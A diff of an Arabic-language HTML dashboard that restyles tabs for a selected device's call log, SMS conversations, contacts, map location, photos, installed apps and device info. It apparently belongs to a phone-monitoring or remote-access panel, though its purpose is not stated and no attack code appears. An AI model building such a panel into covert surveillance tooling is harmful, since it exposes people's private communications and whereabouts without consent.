@@ -14,7 +14,7 @@
                 <select id="deviceSelect" onchange="selectDevice(this.value)">
                     <option value="">اختر الجهاز...</option>
                 </select>
-                <button onclick="deleteDevice()" class="delete-btn">🗑️ حذف الجهاز</button>
+                <button onclick="deleteDevice()" class="delete-btn">🗑️ حذف</button>
                 <button onclick="logout()" class="logout-btn">خروج</button>
             </div>
         </header>
@@ -51,25 +51,18 @@
         <div class="tab-content">
             <!-- المكالمات -->
             <div id="callsTab" class="tab-pane active">
-                <h3>سجل المكالمات</h3>
-                <input type="text" id="callSearch" placeholder="🔍 بحث برقم..." onkeyup="filterCalls()" class="search-input">
-                <table id="callsTable">
-                    <thead>
-                        <tr>
-                            <th>الرقم</th>
-                            <th>الاسم</th>
-                            <th>النوع</th>
-                            <th>المدة</th>
-                            <th>التاريخ</th>
-                        </tr>
-                    </thead>
-                    <tbody></tbody>
-                </table>
+                <h3>📞 المكالمات</h3>
+                <div id="callsListView"></div>
+                <div id="callDetailView" style="display:none;">
+                    <button onclick="backToCallsList()" class="back-btn">⬅️ رجوع</button>
+                    <h4 id="callDetailTitle"></h4>
+                    <div id="callDetailsList"></div>
+                </div>
             </div>
             
             <!-- الرسائل -->
             <div id="smsTab" class="tab-pane">
-                <h3>المحادثات</h3>
+                <h3>💬 المحادثات</h3>
                 <div id="conversationsList"></div>
                 <div id="chatView" style="display:none;">
                     <button onclick="backToConversations()" class="back-btn">⬅️ رجوع</button>
@@ -80,43 +73,33 @@
             
             <!-- جهات الاتصال -->
             <div id="contactsTab" class="tab-pane">
-                <h3>جهات الاتصال</h3>
-                <input type="text" id="contactSearch" placeholder="🔍 بحث..." onkeyup="filterContacts()" class="search-input">
-                <table id="contactsTable">
-                    <thead>
-                        <tr>
-                            <th>الاسم</th>
-                            <th>الأرقام</th>
-                            <th>إجراء</th>
-                        </tr>
-                    </thead>
-                    <tbody></tbody>
-                </table>
+                <h3>👥 جهات الاتصال</h3>
+                <div id="contactsListView"></div>
+                <div id="contactDetailView" style="display:none;">
+                    <button onclick="backToContactsList()" class="back-btn">⬅️ رجوع</button>
+                    <div id="contactDetails"></div>
+                </div>
             </div>
             
             <!-- الموقع -->
             <div id="locationTab" class="tab-pane">
-                <h3>الموقع الجغرافي</h3>
+                <h3>📍 الموقع</h3>
                 <div id="locationDetails"></div>
                 <div id="map" style="height:400px;"></div>
             </div>
             
             <!-- الصور -->
             <div id="imagesTab" class="tab-pane">
-                <h3>الصور</h3>
+                <h3>🖼️ الصور</h3>
                 <div id="imagesGrid" class="images-grid"></div>
             </div>
             
             <!-- التطبيقات -->
             <div id="appsTab" class="tab-pane">
-                <h3>التطبيقات</h3>
+                <h3>📱 التطبيقات</h3>
                 <table id="appsTable">
                     <thead>
-                        <tr>
-                            <th>الاسم</th>
-                            <th>الحزمة</th>
-                            <th>نظام</th>
-                        </tr>
+                        <tr><th>الاسم</th><th>الحزمة</th><th>نظام</th></tr>
                     </thead>
                     <tbody></tbody>
                 </table>
@@ -124,7 +107,7 @@
             
             <!-- الجهاز -->
             <div id="deviceTab" class="tab-pane">
-                <h3>معلومات الجهاز</h3>
+                <h3>📊 معلومات الجهاز</h3>
                 <div id="deviceInfo"></div>
             </div>
         </div>
